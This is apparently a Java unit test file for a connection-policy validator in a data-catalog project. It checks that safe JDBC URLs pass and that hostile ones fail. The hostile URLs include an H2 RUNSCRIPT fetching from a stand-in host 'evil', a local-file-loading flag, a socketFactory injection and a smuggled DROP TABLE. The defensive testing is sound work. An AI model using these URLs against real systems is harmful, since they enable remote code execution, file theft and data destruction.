package io.matedata;

import static org.assertj.core.api.Assertions.*;

import io.matedata.catalog.domain.ConnectionPolicy;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class SecurityPolicyTest {
  @Test
  void acceptsExplicitPostgresAndMysqlHosts() {
    assertThatCode(
            () ->
                ConnectionPolicy.validate(
                    "POSTGRESQL", "jdbc:postgresql://localhost:5432/analytics"))
        .doesNotThrowAnyException();
    assertThatCode(
            () -> ConnectionPolicy.validate("MYSQL", "jdbc:mysql://db.internal:3306/analytics"))
        .doesNotThrowAnyException();
  }

  @Test
  void rejectsDriverInjectionAndLocalFiles() {
    for (String url :
        new String[] {
          "jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://evil'",
          "jdbc:mysql://db/x?allowLoadLocalInfile=true",
          "jdbc:postgresql://db/x?socketFactory=evil",
          "jdbc:mysql://db/x;DROP TABLE x"
        })
      assertThatThrownBy(() -> ConnectionPolicy.validate("MYSQL", url))
          .isInstanceOf(IllegalArgumentException.class);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "mysql",
        "information_schema",
        "performance_schema",
        "sys",
        "MySQL",
        "INFORMATION_SCHEMA"
      })
  void rejectsMysqlSystemCatalogs(String catalog) {
    assertThatThrownBy(() -> ConnectionPolicy.validate("MYSQL", "jdbc:mysql://db:3306/" + catalog))
        .isInstanceOf(IllegalArgumentException.class)
        .hasMessageContaining("系统");
  }

  @Test
  void allowsOrdinaryDatabaseNamesIncludingPostgres() {
    assertThatCode(
            () -> ConnectionPolicy.validate("POSTGRESQL", "jdbc:postgresql://db:5432/postgres"))
        .doesNotThrowAnyException();
    assertThatCode(() -> ConnectionPolicy.validate("MYSQL", "jdbc:mysql://db:3306/mysql_analytics"))
        .doesNotThrowAnyException();
  }
}
